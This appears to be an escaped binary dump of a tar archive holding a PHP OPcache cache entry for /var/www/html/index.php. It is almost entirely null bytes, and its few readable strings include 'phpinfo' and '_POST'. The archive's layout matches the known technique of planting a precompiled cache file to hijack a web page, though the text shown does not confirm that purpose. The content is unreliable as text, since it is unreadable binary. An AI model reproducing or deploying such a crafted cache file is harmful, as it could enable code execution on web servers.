x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000666\x000000000\x000000000\x0000000001700\x0014510444150\x00017165\x00 0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00OPCACHE\x00214510e772fba140ea7a33a277f2799ep\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa9\xf9 e\x00\x00\x00\x00\x07]1\xcd    \xd8\x01\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00badm\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00ibu.\xb0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00@\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80F\&quot;e\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00#olh\x99F\&quot;e\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xb2$\x83\xaf\xdd\xaa\xdf\x8c\x17\x00\x00\x00\x00\x00\x00\x00/var/www/html/index.php\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\&quot;@\xb0\xc5\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x90\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xf9\xe0\xf8\xab\xb5\xd0\x00\x80\x07\x00\x00\x00\x00\x00\x00\x00phpinfo\x00\x02\x00\x00\x00V\x00\x00\x00jQ\xe3\x0e1\x00\x00\x80\x05\x00\x00\x00\x00\x00\x00\x00_POST\x00\x00\x00E\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00=\x00\x01\x00\x8b\x08\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x02\x00\x00\x00\x81\x00\x00\x007\x06\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xff\xff\xff\xff`\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00P\x01\x00\x02A\x06\x00\x00\x00\x00\x00\x00`\x00\x00\x00\x02\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00Q\x02\x01\x02\xf1\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00\x03\x00\x00\x00I\x02\x00\x00F\x05\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\x00\x00\x00&gt;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0